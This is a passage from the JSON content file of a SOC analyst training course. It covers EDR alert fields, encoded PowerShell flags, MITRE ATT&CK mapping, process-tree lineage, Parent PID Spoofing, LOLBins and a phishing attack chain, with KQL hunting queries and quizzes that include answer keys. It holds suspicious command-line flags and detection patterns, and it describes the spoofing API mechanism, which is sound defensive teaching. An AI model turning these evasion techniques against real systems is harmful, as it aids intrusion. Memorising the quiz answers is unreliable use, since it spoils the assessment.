          "Severity scales are vendor-defined, not a universal industry standard, always confirm the scale before comparing"
        ]
      },
      {
        "pageNumber": 5,
        "title": "Reading Command Lines Like an Analyst",
        "body": "The command line is often the single richest field in an alert, and learning to read it fluently is one of the highest-value skills this module teaches.\n\n### Encoded PowerShell\nPowerShell supports a **-EncodedCommand** (or its shorthand **-enc**) flag that accepts a base64-encoded script instead of plain text. This is legitimately used by some automation tools, but it is also a favorite obfuscation technique for attackers, because it hides the actual script content from a casual glance at the command line, and from some naive detection rules that only pattern-match on plaintext keywords. A skilled analyst decodes the base64 (a standard, reversible encoding, not encryption) to see what the script actually does before forming a verdict.\n\n### Other suspicious flags worth recognizing\n- **-WindowStyle Hidden** (or **-w hidden**). Suppresses the visible PowerShell window, so a user would not see it running\n- **-ExecutionPolicy Bypass** (or **-ep bypass**). Overrides the default policy that would otherwise block unsigned scripts from running\n- **-NoProfile** (or **-nop**). Skips loading the user's PowerShell profile, slightly faster startup, commonly used by both legitimate scripts and attackers alike\n\n### None of these flags are malicious by themselves\nThis is a critical nuance: IT administrators legitimately use -ExecutionPolicy Bypass and -WindowStyle Hidden in real automation scripts every day. Seeing one of these flags alone is not sufficient evidence for a True Positive verdict. It raises the likelihood estimate from the previous module's risk-based thinking, but it must be combined with other context (an unusual parent process, an unexpected user, correlation with a phishing email) before a confident verdict is reached.\n\n### Command lines as a preview of the next lesson\nReading a command line closely is really reading a fragment of a process tree: what launched this, with what arguments. The next lesson in this module, Process trees in depth, expands this single-process view into the full parent-child lineage that gives these command-line details their real investigative context.",
        "keyPoints": [
          "-EncodedCommand / -enc hides a PowerShell script's real content behind reversible base64 encoding",
          "-WindowStyle Hidden, -ExecutionPolicy Bypass, and -NoProfile are commonly abused flags, but none are malicious alone",
          "Suspicious flags raise the likelihood estimate but require corroborating context before a confident verdict",
          "A command line is a fragment of a larger process tree, which the next lesson expands on fully"
        ]
      },
      {
        "pageNumber": 6,
        "title": "Mapping Fields to MITRE ATT&CK",
        "body": "You saw CrowdStrike's **Tactic** and **Technique** fields on page 2. This page explains what those fields actually connect to, previewing the MITRE ATT&CK module that comes later in this Learning Path.\n\n### What MITRE ATT&CK is, briefly\nMITRE ATT&CK is a publicly maintained knowledge base that catalogs real-world adversary behavior into named **tactics** (an attacker's tactical goal, like \"Defense Evasion\" or \"Credential Access\") and **techniques** (the specific method used to achieve that goal, like \"Obfuscated Files or Information\" or \"Process Injection\"), each with a unique identifier (for example, T1027 for Obfuscated Files or Information). A full treatment of the framework's structure (all fourteen Enterprise tactics, sub-techniques, and how to use the matrix) is covered in the MITRE ATT&CK module later in this path.\n\n### Why an alert's Tactic/Technique fields matter right now\nWhen CrowdStrike (or another vendor) labels a detection's Tactic as \"Defense Evasion\" and Technique as \"Obfuscated Files or Information,\" it is not describing the detection casually. It is mapping the specific behavior observed (in our worked example, an encoded PowerShell command) onto a standardized, named category that any analyst trained on ATT&CK will immediately recognize, regardless of which vendor's tool produced the alert.\n\n### A concrete example: masquerading and LOLBins\nA separate, extremely common technique worth knowing now, because the next lesson builds directly on it: **Masquerading** (technique T1036) (making a malicious file or process look legitimate by manipulating its name or location) is also filed under the Defense Evasion tactic. A malicious file named svchost.exe running from an unusual folder (rather than its legitimate location) is a classic masquerading example your EDR alert's Tactic field might surface.\n\n### Why this matters for escalation quality\nRecall from the SOC Foundations module that a strong escalation package explains *why* something is suspicious. Citing the specific ATT&CK tactic and technique, \"Tactic: Defense Evasion, Technique: Obfuscated Files or Information (T1027)\". Gives a Tier 2 analyst an immediate, standardized frame of reference, rather than a vague description they have to reinterpret themselves.",
        "keyPoints": [
          "MITRE ATT&CK catalogs adversary behavior into named tactics (goals) and techniques (specific methods), each with an ID",
          "An alert's Tactic/Technique fields map observed behavior onto standardized categories recognized across the industry",
          "Masquerading (T1036), making malicious files look legitimate, also falls under the Defense Evasion tactic",
          "Citing specific ATT&CK tactic and technique names strengthens an escalation package's clarity for the receiving analyst"
        ]
      },
      {
        "pageNumber": 7,
        "title": "Benign Look-Alikes vs. Malicious: Side by Side",
        "body": "Two alerts can share nearly identical surface features while representing completely different verdicts. Distinguishing them is where everything from this module and the previous one comes together.\n\n### Alert A: an IT automation script\nFileName: powershell.exe. ParentImageFileName: C:\\Windows\\System32\\schtasks.exe launching from a Scheduled Task. CommandLine includes -ExecutionPolicy Bypass and -NoProfile, running a script named Deploy-SoftwareUpdate.ps1 stored in a shared IT deployment folder. AccountName: a service account used exclusively for software deployment, with a well-established history of this exact activity pattern going back months.\n\n### Alert B: the phishing payload\nFileName: powershell.exe. ParentImageFileName: WINWORD.EXE, launched three minutes after the user opened an email attachment. CommandLine includes -WindowStyle Hidden and -EncodedCommand with a long base64 string that decodes to a download command reaching out to an external IP address. AccountName: an accounts-payable clerk with no history of any PowerShell activity whatsoever.\n\n### Applying the checklist from the previous module\nBoth alerts feature PowerShell with a \"suspicious\" flag. Applying **Context** (who/what/when/where/how) and **Correlate** (checking history and expected patterns) immediately separates them: Alert A's parent process (a scheduled task), account (a dedicated deployment service account with matching history), and script location (a known shared IT folder) all corroborate a benign, expected pattern, a Benign True Positive if any detection rule flagged it at all. Alert B's parent process (Word, following an email attachment), account (no PowerShell history), and destination (an unfamiliar external IP) corroborate a True Positive.\n\n### The lesson beneath the lesson\nNotice that the deciding factor was never the PowerShell flags themselves. Both alerts had \"suspicious-looking\" flags. The deciding factor was the **surrounding context**: parent process, account history, and destination. This is exactly why the previous module insisted that Context and Correlate come before Confirm in the triage checklist, jumping straight to a verdict based on the command line alone would have produced the wrong answer for at least one of these two alerts.",
        "keyPoints": [
          "Two alerts with nearly identical PowerShell flags can represent completely different verdicts",
          "Parent process, account history, and destination are what actually separate a benign pattern from a malicious one",
          "Applying Context and Correlate before Confirm prevents a verdict based on surface features alone",
          "A suspicious-looking command-line flag is a starting point for investigation, not a verdict by itself"
        ]
      },
      {
        "pageNumber": 8,
        "title": "Worked Example: Full Alert Walkthrough",
        "body": "Let's put every field and framework from this module together on one complete, realistic alert.\n\n### The alert\nA CrowdStrike Falcon detection fires on host **FIN-WKS-0231**. FileName: rundll32.exe. ParentImageFileName: WINWORD.EXE. ParentCommandLine references a file named shipping_label_4471.docm opened four minutes earlier. CommandLine passes an unusual, unfamiliar DLL export function as an argument. SeverityName: High. Tactic: Defense Evasion. Technique: System Binary Proxy Execution.\n\n### Questions an analyst should ask\nApplying the five questions from the Mental Models lesson: **Who**, check the account's history with rundll32.exe (none found). **What**, rundll32.exe, a legitimate Windows utility, is being used to run code from a DLL rather than opening it directly. This pattern of abusing a trusted system binary to run something else is exactly what \"System Binary Proxy Execution\" describes. **When**, minutes after a macro-enabled Word document (.docm) opened. **Where**: a standard workstation. **How**: the parent-child chain (Word to rundll32) has no legitimate business justification the analyst can find.\n\n### Applying the field-reading skills from this module\nThe ParentImageFileName field (page 2) immediately establishes the Word-to-rundll32 chain. The CommandLine field reveals the specific DLL export being invoked, recognizing that rundll32.exe normally runs known, legitimate DLLs, not arbitrary ones passed as arguments following a document open, is the key discriminator. The Tactic and Technique fields (page 6) confirm this matches a named, recognized pattern rather than the analyst's own guesswork.\n\n### Reaching a verdict\nNo legitimate business process explains Word invoking rundll32.exe with an unfamiliar DLL export immediately after a macro document opens, ruling out Benign True Positive. The detection correctly matched a real, coherent attack pattern, ruling out False Positive. This is a **True Positive**, and per the SOC Foundations module, it should be escalated with a package citing the exact chain: Word to rundll32.exe, Technique: System Binary Proxy Execution, occurring immediately after the macro document opened.",
        "keyPoints": [
          "ParentImageFileName, CommandLine, Tactic, and Technique together build a complete picture from raw alert fields",
          "Rundll32.exe is a legitimate Windows utility, but invoking it with an unfamiliar DLL export after a document opens is a recognized abuse pattern",
          "Ruling out both False Positive and Benign True Positive explicitly is what makes a True Positive verdict defensible",
          "A field-grounded escalation citing the exact process chain and ATT&CK technique gives Tier 2 an immediate frame of reference"
        ]
      }
    ],
    "quiz": [
      {
        "question": "What is the key behavioral difference between EDR and legacy signature-based antivirus?",
        "options": [
          {
            "label": "EDR watches behavior over time using a rolling telemetry window, while legacy AV mainly matches known-bad file signatures",
            "value": "a"
          },
          {
            "label": "Legacy AV only runs on servers while EDR only runs on laptops and workstations",
            "value": "b"
          },
          {
            "label": "EDR cannot detect any malware that legacy AV would also catch",
            "value": "c"
          },
          {
            "label": "There is no meaningful difference: the two terms describe identical technology under different marketing names",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "EDR's defining advantage is behavioral, time-windowed visibility rather than pure signature matching, which lets it catch modified or novel malware that would slip past a hash-only scanner. Deployment scope (servers vs. workstations) is not the actual distinction, and EDR generally covers the same or broader ground as legacy AV, not less."
      },
      {
        "question": "In a CrowdStrike Falcon detection, which field would you check to find the SHA-256 hash of the file involved?",
        "options": [
          {
            "label": "ParentImageFileName",
            "value": "a"
          },
          {
            "label": "SHA256String",
            "value": "b"
          },
          {
            "label": "SeverityName",
            "value": "c"
          },
          {
            "label": "CommandLine",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "SHA256String is the documented CrowdStrike field for the file's SHA-256 hash. ParentImageFileName identifies the launching process, SeverityName is the categorical severity label, and CommandLine holds the launch arguments. None of these carry hash information."
      },
      {
        "question": "An analyst is investigating a Microsoft Defender DeviceProcessEvents record and notices the SHA256 column is empty for the process in question. What does this lesson say the analyst should do?",
        "options": [
          {
            "label": "Conclude the process must be malicious, since only malware would have a missing hash",
            "value": "a"
          },
          {
            "label": "Assume the record is corrupted and discard it from the investigation",
            "value": "b"
          },
          {
            "label": "Rely on the SHA1 column instead, since Microsoft's own documentation notes SHA256 is usually not populated in this table",
            "value": "c"
          },
          {
            "label": "Escalate immediately to Tier 3 purely because of the missing hash field",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "The lesson notes explicitly, per Microsoft's own documentation, that SHA256 is usually not populated in DeviceProcessEvents and that SHA1 is the column analysts should rely on there. A missing SHA256 value is a known, routine quirk of this specific table, not evidence of malice or corruption."
      },
      {
        "question": "A SOC ingests both CrowdStrike Falcon detections and Microsoft Sentinel incidents into one SIEM. An analyst sees a Falcon detection labeled 'High' and a Sentinel incident also labeled 'High' and assumes they represent identical urgency. What does this lesson say about that assumption?",
        "options": [
          {
            "label": "The assumption is safe, since severity labels are standardized identically across every security vendor",
            "value": "a"
          },
          {
            "label": "The assumption is safe because both platforms use exactly the same underlying numeric scoring formula",
            "value": "b"
          },
          {
            "label": "Neither platform actually uses severity labels, so the comparison is meaningless",
            "value": "c"
          },
          {
            "label": "The assumption may be wrong, since Falcon has five severity tiers including a Critical tier above High, while Sentinel's four-tier scale tops out at High",
            "value": "d"
          }
        ],
        "answer": "d",
        "explanation": "The lesson explains that Falcon's five-tier scale (up to Critical) and Sentinel's four-tier scale (topping out at High) are not directly equivalent, so the same label can represent different actual urgency across vendors: severity scales are vendor-defined, not a universal standard."
      },
      {
        "question": "Two alerts both show powershell.exe launched with the -ExecutionPolicy Bypass flag. Alert A's parent process is a scheduled task run by a dedicated IT deployment service account with months of matching history. Alert B's parent process is WINWORD.EXE, launched minutes after an unfamiliar email attachment was opened by an account with no prior PowerShell activity. What does this lesson say determines the correct verdict for each?",
        "options": [
          {
            "label": "Both should automatically be treated as True Positives, since -ExecutionPolicy Bypass is inherently malicious regardless of context",
            "value": "a"
          },
          {
            "label": "The surrounding context (parent process, account history, and destination) determines the verdict, not the command-line flag alone",
            "value": "b"
          },
          {
            "label": "Both should automatically be closed as benign, since -ExecutionPolicy Bypass is a common, harmless administrative flag",
            "value": "c"
          },
          {
            "label": "Only the numeric severity score assigned by the detection rule should be used to decide, ignoring all other fields",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "The lesson's side-by-side comparison shows that the deciding factor was never the shared PowerShell flag: it was the parent process, account history, and destination surrounding each alert. Treating the flag alone as automatically malicious or automatically benign, or relying on severity alone, would produce the wrong verdict for at least one of the two alerts."
      }
    ]
  },
  "soc-analyst--process-trees-in-depth": {
    "pages": [
      {
        "pageNumber": 1,
        "video": {
          "src": "/lesson-videos/process-trees-in-depth/process-trees-in-depth.mp4",
          "caption": "Explainer, Process Trees in Depth · subtitles: English · עברית · Español (CC menu)",
          "tracks": [
            { "srclang": "en", "label": "English", "src": "/lesson-videos/process-trees-in-depth/en.vtt", "default": true },
            { "srclang": "he", "label": "עברית", "src": "/lesson-videos/process-trees-in-depth/he.vtt" },
            { "srclang": "es", "label": "Español", "src": "/lesson-videos/process-trees-in-depth/es.vtt" }
          ]
        },
        "title": "What Is a Process Tree?",
        "body": "Every running program on a Windows system is a **process**, identified by a numeric **PID (Process ID)** unique to that running instance. Almost every process is launched by another process, its **parent**, identified by the child's **PPID (Parent Process ID)**. Follow that parent-child chain far enough back on any Windows machine and you eventually reach the very first user-mode process created at boot. This chain of \"who launched whom\" is called a **process tree** or **process lineage**, and it is one of the single most valuable pieces of context an EDR (Endpoint Detection and Response) platform records.\n\n### Why lineage matters more than any single process alone\nKnowing that powershell.exe ran tells you almost nothing on its own: PowerShell is a legitimate, heavily used administrative tool present on every modern Windows machine. Knowing that powershell.exe was launched **by Microsoft Word, three minutes after a user opened an email attachment** tells you almost everything you need for an initial verdict. The previous module's five investigative questions (who, what, when, where, how) depend heavily on the \"how\", and lineage is usually where \"how\" lives.\n\n### PID reuse: a subtlety worth knowing early\nWindows reuses PIDs over time. Once a process exits, its PID can be assigned to an entirely unrelated new process later. This means a PID alone, without a timestamp, is not a reliable unique identifier across a long time window. This is precisely why EDR platforms pair PID with a **process creation time** (or, in CrowdStrike's telemetry, a unique **process start key**): the combination of PID and creation time uniquely identifies one specific process instance, never to be confused with an unrelated later process that happens to reuse the same number.\n\n### What this lesson builds toward\nThis lesson goes deeper than the previous module's brief mention of parent processes: you will learn what a normal Windows process tree actually looks like, how to read lineage fields in real telemetry, which lineage patterns are red flags, and a specific technique, Parent PID Spoofing, that attackers use to fake this very information you are learning to trust.",
        "keyPoints": [
          "A process tree traces the parent-child launch chain (PID to PPID) across running and historical processes",
          "The same process (like powershell.exe) means very different things depending on what launched it",
          "PIDs get reused by Windows over time, so PID plus creation time, not PID alone, uniquely identifies one process instance",
          "This lesson builds toward normal lineage patterns, suspicious patterns, and how attackers can fake lineage itself"
        ]
      },
      {
        "pageNumber": 2,
        "title": "Normal Windows Process Lineage",
        "body": "Before you can spot an abnormal process tree, you need a working mental map of what a normal one looks like on a typical Windows workstation.\n\n### The system boot chain\nAt boot, the Windows kernel creates the **System** process (always PID 4), which spawns **smss.exe** (Session Manager Subsystem). smss.exe in turn spawns **wininit.exe** (Windows Initialization, session 0, the non-interactive system session) and, for the first interactive user session, **winlogon.exe** (Windows Logon, which manages the login screen and user sessions). wininit.exe spawns **services.exe** (the Service Control Manager), which is the parent of almost every Windows service process: most importantly **svchost.exe** (Service Host), the generic container process that hosts many individual Windows services grouped together.\n\n### The interactive user session chain\nwinlogon.exe spawns **userinit.exe** briefly during logon, which in turn launches **explorer.exe** (Windows Explorer, the desktop shell) before exiting. From that point on, explorer.exe is the parent of essentially every application a user double-clicks or launches from the Start menu. Web browsers, Office applications, and so on.\n\n### Why svchost.exe's parent matters so much\nBecause svchost.exe is such a common, legitimate process, it is also a favorite disguise for malware: a topic the next section on suspicious patterns expands on. The single most important lineage fact to memorize from this page: **legitimate svchost.exe processes are always children of services.exe**. A svchost.exe with any other parent is immediately worth investigating.\n\n### Visualizing the normal tree\nThe diagram below shows this lineage as a single map. Worth returning to any time a real process tree in an investigation looks unfamiliar, to quickly identify which branch of the \"normal\" tree it should belong to, if any.",
        "codeExample": "flowchart TD\n    A[\"System (PID 4)\"] --> B[smss.exe]\n    B --> C[wininit.exe]\n    B --> D[winlogon.exe]\n    C --> E[services.exe]\n    E --> F[\"svchost.exe (many instances)\"]\n    D --> G[userinit.exe]\n    G --> H[explorer.exe]\n    H --> I[\"User applications (browser, Office, etc.)\"]",
        "keyPoints": [
          "The boot chain runs System to smss.exe to wininit.exe/winlogon.exe to services.exe to svchost.exe",
          "explorer.exe, launched via winlogon.exe and userinit.exe, is the parent of nearly all user-launched applications",
          "Legitimate svchost.exe processes are always children of services.exe. Any other parent is a red flag",
          "Having this normal map memorized is what makes an abnormal process tree immediately recognizable"
        ]
      },
      {
        "pageNumber": 3,
        "title": "Reading Lineage in Telemetry Fields",
        "body": "The previous module taught you individual EDR fields like CommandLine and ParentImageFileName. This page focuses specifically on the fields that reconstruct full lineage, across both major vendors covered in this path.\n\n### Microsoft Defender: DeviceProcessEvents lineage fields\n- **InitiatingProcessParentFileName**, the name of the *grandparent* process (the parent of the process that launched this event's process)\n- **InitiatingProcessParentId**, the grandparent's PID\n- **InitiatingProcessParentCreationTime**, the grandparent's process creation timestamp\n\nCombined with **InitiatingProcessFileName** (the immediate parent, covered in the previous module), these fields let an analyst reconstruct three generations of lineage (grandparent, parent, and the process itself) from one single log row, without needing a separate query.\n\n### CrowdStrike Falcon: lineage via ParentProcessId and process start keys\nCrowdStrike's telemetry links **ParentProcessId** to the specific parent instance, resolved unambiguously using the parent's own process start key (the PID-plus-creation-time pairing introduced on page 1) rather than a bare PID that could theoretically have been reused.\n\n### Why creation time is the detail that catches spoofing\nThis is the field that matters most for the topic later in this lesson: **InitiatingProcessParentCreationTime** tells you exactly when the recorded parent process actually started. If an attacker successfully fakes which process appears as the \"parent\" in telemetry (the topic of page 5), the creation timestamp of the process they claimed as parent may not line up sensibly with the real sequence of events, for example, a claimed parent that, per its own creation time, had already been running for hours before doing something that would not normally happen that late in its lifecycle.\n\n### A practical habit worth building now\nWhen investigating any alert, get in the habit of pulling grandparent lineage even when the immediate parent looks obviously suspicious. Attackers sometimes chain multiple legitimate-looking hops (for example, a scheduled task launching a script host, which launches PowerShell) specifically to make the immediate parent look more innocuous than the full chain actually is.",
        "codeExample": "DeviceProcessEvents\n| where Timestamp > ago(1h)\n| where FileName == \"powershell.exe\"\n| project Timestamp, DeviceName,\n    FileName, ProcessCommandLine,\n    InitiatingProcessFileName, InitiatingProcessCreationTime,\n    InitiatingProcessParentFileName, InitiatingProcessParentCreationTime\n| order by Timestamp desc",
        "keyPoints": [
          "InitiatingProcessParentFileName and InitiatingProcessParentId reach one generation further up than the immediate parent",
          "CrowdStrike resolves lineage via a parent's process start key, avoiding ambiguity from PID reuse",
          "Creation timestamps on parent processes can reveal inconsistencies when parent information has been faked",
          "Pulling grandparent lineage, not just the immediate parent, can reveal a longer, more suspicious chain"
        ]
      },
      {
        "pageNumber": 4,
        "title": "Suspicious Lineage Patterns",
        "body": "With a normal map in mind (page 2) and the fields to read lineage (page 3), you can now recognize the specific parent-child combinations that experienced analysts treat as immediate red flags.\n\n### A reference table of suspicious pairings\n| Parent process | Child process | Why it's suspicious |\n|---|---|---|\n| WINWORD.EXE / EXCEL.EXE / POWERPNT.EXE | cmd.exe or powershell.exe | Office applications spawning a shell almost always indicates a malicious macro. Legitimate documents do not need to launch a command interpreter |\n| OUTLOOK.EXE | powershell.exe or cmd.exe | The same pattern via email preview or an attachment, rather than a downloaded document |\n| svchost.exe | anything other than services.exe as *its own* parent | A svchost.exe whose parent is not services.exe is not a legitimate service host at all. Likely process masquerading (naming a malicious file svchost.exe to blend in) |\n| powershell.exe | mshta.exe, rundll32.exe, or regsvr32.exe | Legitimate PowerShell administration rarely needs to pivot into these specific \"living-off-the-land\" utilities in sequence |\n\n### Why this table is a starting point, not a verdict machine\nRecall the previous module's side-by-side comparison of two PowerShell alerts with identical flags but opposite verdicts. The same caution applies here: none of these pairings are automatically malicious, a security team's own endpoint management tooling might legitimately launch PowerShell from unusual parents during patch deployment, for instance. What this table gives you is a fast way to know *which* alerts deserve the full Context-Correlate-Confirm checklist first, when you are triaging a large queue and need to prioritize your attention.\n\n### Reading the table alongside real evidence\nWhen any of these pairings show up in a real alert, the very next things to check are exactly the fields from page 3: what does the grandparent lineage look like, what is the full command line, and does the account's history support this being expected behavior. The table tells you where to look harder: the surrounding evidence tells you what verdict to reach.",
        "keyPoints": [
          "Office applications (Word, Excel, PowerPoint, Outlook) spawning a shell is a classic macro-malware pattern",
          "A svchost.exe whose own parent is not services.exe suggests process masquerading, not a real service host",
          "PowerShell pivoting into mshta.exe, rundll32.exe, or regsvr32.exe in sequence is a recognized suspicious chain",
          "These pairings prioritize which alerts deserve deeper investigation first. They are not automatic verdicts"
        ]
      },
      {
        "pageNumber": 5,
        "title": "Parent PID Spoofing (T1134.004)",
        "body": "So far, this lesson has treated the \"parent\" field in telemetry as a trustworthy fact. Sophisticated attackers know defenders rely on this field heavily, and have developed a specific technique to falsify it.\n\n### What Parent PID Spoofing is\n**Parent PID Spoofing** is MITRE ATT&CK sub-technique **T1134.004**, filed under the parent technique **T1134 (Access Token Manipulation)**. It maps to two ATT&CK tactics: **Privilege Escalation** and **Defense Evasion**. The technique works by using a specific Windows API mechanism (the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute, set via the UpdateProcThreadAttribute function when calling CreateProcess) that lets a process explicitly declare which *other* process should be recorded as its parent, rather than the process that actually, technically, launched it.\n\n### Why an attacker bothers\nTwo distinct motives, matching the two tactics: **Defense Evasion**, many detection rules and EDR heuristics specifically flag unusual parent-child pairings (exactly the table from the previous page), so spoofing the parent to appear as a trusted process like explorer.exe defeats those rules at the source, before an analyst ever sees the alert. **Privilege Escalation**, if the spoofed parent is a process running with higher privileges (potentially SYSTEM-level), the child process can, in certain circumstances, inherit elevated characteristics associated with that claimed parent.\n\n### How this connects to what you already know\nThis is exactly why page 3 emphasized creation timestamps. A spoofed parent field will still show the *name* of a legitimate process like explorer.exe, but if you pull that claimed parent's actual creation time and recent activity, it may not sensibly correspond to a process that would plausibly have just launched something new, for instance, an explorer.exe instance that has been running quietly and idle for six hours suddenly appearing as the immediate parent of a brand-new PowerShell process launching an unfamiliar payload.\n\n### The investigative takeaway\nParent PID Spoofing does not mean lineage fields are useless. It means a suspiciously \"too normal\" parent on an otherwise unusual detection deserves the same scrutiny as an outright suspicious parent. If everything else about a detection is alarming except the parent field looks perfectly innocent, that mismatch is itself a signal worth investigating further, not a reason to dismiss the alert.",
        "keyPoints": [
          "Parent PID Spoofing (T1134.004) is a sub-technique of Access Token Manipulation (T1134), mapping to both Privilege Escalation and Defense Evasion",
          "Attackers use the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS mechanism via CreateProcess to declare a false parent process",
          "Spoofing defeats parent-based detection rules and, in some cases, can help inherit privileges from the claimed parent",
          "A suspiciously 'too normal' claimed parent alongside otherwise alarming behavior deserves extra scrutiny, not automatic trust"
        ]
      },
      {
        "pageNumber": 6,
        "title": "Living-off-the-Land Binaries in Process Trees",
        "body": "Page 4's suspicious-pairing table mentioned mshta.exe, rundll32.exe, and regsvr32.exe without much explanation. These belong to a well-known category worth understanding in depth: **LOLBins**, short for **Living-off-the-Land Binaries**. Legitimate, digitally signed Windows utilities that attackers repurpose to execute malicious code, precisely because they are trusted, already present on every Windows machine, and often overlooked by security tooling that focuses on obviously foreign executables.\n\n### Rundll32.exe. T1218.011\nrundll32.exe is a legitimate Windows utility for running functions exported by DLL (Dynamic Link Library) files. It is part of a broader ATT&CK technique family, **T1218 (System Binary Proxy Execution)**, under the **Defense Evasion** tactic; its rundll32-specific sub-technique is **T1218.011**. Attackers abuse it to execute malicious code contained in a DLL while the process list shows only \"rundll32.exe\": a name unlikely to draw attention on its own.\n\n### Regsvr32.exe. T1218.010\nregsvr32.exe legitimately registers and unregisters DLL-based COM (Component Object Model) components with Windows. Its ATT&CK sub-technique, **T1218.010**, also falls under System Binary Proxy Execution and Defense Evasion. It has a well-documented capability to load a script directly from a remote location, making it attractive for attackers who want to avoid dropping a malicious file to disk at all.\n\n### Mshta.exe. T1218.005\nmshta.exe runs Microsoft HTML Applications (.hta files). Standalone applications using Internet Explorer's rendering engine and scripting support, but running outside the browser and its usual security restrictions. Its sub-technique, **T1218.005**, is likewise filed under System Binary Proxy Execution and Defense Evasion.\n\n### The common thread across all three\nEach of these tools is legitimate, signed by Microsoft, and present by default, which is exactly why they are valuable to an attacker and exactly why \"what launched this LOLBin, and why\" (the lineage skill from earlier pages) is the single most important question when one of them appears in an unusual chain, such as following an Office document or an encoded PowerShell command.",
        "keyPoints": [
          "LOLBins (Living-off-the-Land Binaries) are legitimate, signed Windows utilities repurposed to run malicious code",
          "Rundll32.exe (T1218.011), Regsvr32.exe (T1218.010), and Mshta.exe (T1218.005) are all sub-techniques of System Binary Proxy Execution (T1218), Defense Evasion tactic",
          "Regsvr32.exe can load a script directly from a remote location without dropping a file to disk",
          "The lineage question (what launched this LOLBin, and why) matters more than the LOLBin's name alone"
        ]
      },
      {
        "pageNumber": 7,
        "title": "Building a Mini Investigation from a Process Tree",
        "body": "With the vocabulary and red-flag patterns from this lesson in hand, here is how to actually build an investigation outward from a single suspicious process, using the lineage-reconstruction query pattern introduced on page 3.\n\n### Step 1: pull the full local lineage for the alerting process\nStart with the exact query style from page 3, filtering DeviceProcessEvents (or the equivalent CrowdStrike fields) for the specific process, timestamp window, and host, and projecting both immediate-parent and grandparent fields in one row.\n\n### Step 2: check the claimed parent's own creation time and behavior\nPer page 5, pull a second query scoped to the claimed parent process itself, checking when it actually started and what else it has done recently. This is the step that would catch a spoofed parent: a claimed parent whose own history doesn't sensibly support having just launched something new.\n\n### Step 3: check for sibling activity\nQuery for other child processes launched by the same parent around the same time window. A single Word document that only ever spawns one PowerShell process is a different, and often more limited, situation than one that spawns PowerShell, which then spawns rundll32.exe, which then spawns a network connection, all within seconds.\n\n### A combined investigative query\nThe query below builds on page 3's pattern, extending it to also check whether the flagged process's parent spawned anything else in a tight time window: the \"sibling activity\" check from Step 3.\n\n### Turning this into an escalation\nPer the SOC Foundations module, everything gathered in these three steps (full lineage, parent legitimacy, and sibling activity) becomes the timeline and evidence section of a strong escalation package, giving Tier 2 a complete picture rather than a single alarming process name.",
        "codeExample": "let FlaggedTime = datetime(2026-01-15T14:08:00Z);\nlet FlaggedHost = \"FIN-WKS-0231\";\nDeviceProcessEvents\n| where DeviceName == FlaggedHost\n| where Timestamp between (FlaggedTime - 2m .. FlaggedTime + 2m)\n| where InitiatingProcessFileName =~ \"WINWORD.EXE\"\n| project Timestamp, FileName, ProcessCommandLine,\n    InitiatingProcessFileName, InitiatingProcessCreationTime\n| order by Timestamp asc",
        "keyPoints": [
          "A mini investigation pulls full lineage, checks the claimed parent's own legitimacy, and checks sibling activity",
          "Checking the claimed parent's creation time and recent behavior is what would catch a spoofed parent field",
          "Multiple rapid child processes from the same parent indicate a longer, more automated attack chain",
          "The combined evidence from all three steps becomes the timeline in a strong escalation package"
        ]
      },
      {
        "pageNumber": 8,
        "title": "Practice Scenario: Full Attack Chain",
        "body": "Let's trace one complete, realistic attack chain from start to finish, applying every concept from this lesson in sequence.\n\n### The chain\nA phishing email delivers a macro-enabled Word document to a NexaCorp employee. The user opens it and enables macros. WINWORD.EXE spawns cmd.exe, which spawns powershell.exe with an encoded command. The decoded command downloads and executes a second-stage payload via rundll32.exe, which then opens a network connection to an external address.\n\n### Mapping the chain to this lesson's concepts\n- **WINWORD.EXE to cmd.exe**. Matches the suspicious pairing table from page 4 exactly: an Office application spawning a shell\n- **cmd.exe to powershell.exe**, a shell spawning another shell/interpreter, extending an already-suspicious chain rather than a single isolated event\n- **powershell.exe to rundll32.exe**. Matches the LOLBin pivot pattern from page 6; rundll32.exe here is System Binary Proxy Execution (T1218.011), Defense Evasion tactic\n- **rundll32.exe's network connection**: the payload's actual objective, likely establishing command-and-control (C2) or downloading further tooling\n\n### Why tracing the full chain matters more than any single hop\nAn analyst who only saw the final rundll32.exe network connection, without the lineage reconstruction skills from this lesson, might see just \"a signed Windows utility made a network connection\", which, alone, is common and unremarkable. It is only by walking the full chain back to WINWORD.EXE and the original phishing email that the true severity becomes clear. This is the practical payoff of everything in this lesson: lineage is not a nice-to-have detail, it is frequently the entire difference between a dismissed alert and a caught intrusion.\n\n### Questions to reason through\nBefore moving to the next module, consider: at which single hop in this chain would a spoofed parent (page 5) be most valuable to the attacker, and why? Which hop would benefit most from checking sibling activity (page 7)? These are exactly the kinds of questions a Tier 2 analyst asks when reviewing a Tier 1 escalation on a chain like this one.",
        "codeExample": "flowchart TD\n    A[Phishing email delivered] --> B[\"User opens attachment, enables macros\"]\n    B --> C[WINWORD.EXE]\n    C -->|spawns| D[cmd.exe]\n    D -->|spawns| E[\"powershell.exe -EncodedCommand\"]\n    E -->|spawns| F[rundll32.exe]\n    F -->|network connection| G[\"External C2 address\"]",
        "keyPoints": [
          "A full attack chain often strings together multiple individually-recognizable suspicious pairings in sequence",
          "The final hop in a chain can look unremarkable in isolation. Full lineage reveals the true severity",
          "WINWORD.EXE to cmd.exe to powershell.exe to rundll32.exe combines an Office-spawns-shell pattern with a LOLBin pivot",
          "Reasoning about where spoofing or sibling activity would matter most is exactly how a Tier 2 analyst reviews an escalation"
        ]
      }
    ],
    "quiz": [
      {
        "question": "Why is PID (Process ID) alone, without a creation timestamp, an unreliable way to uniquely identify a specific process instance over time?",
        "options": [
          {
            "label": "Windows reuses PIDs after a process exits, so the same PID number can later refer to a completely different, unrelated process",
            "value": "a"
          },
          {
            "label": "PIDs are randomly regenerated every few seconds even for a single running process",
            "value": "b"
          },
          {
            "label": "PIDs are only assigned to processes launched by services.exe, not to user applications",
            "value": "c"
          },
          {
            "label": "EDR platforms do not record PIDs at all, only process names",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "PID reuse after a process exits is exactly why EDR platforms pair PID with a creation timestamp (or a unique process start key) to uniquely identify one specific process instance. PIDs do not change while a process is running, are assigned to all processes regardless of parent, and are in fact recorded by EDR platforms alongside process names."
      },
      {
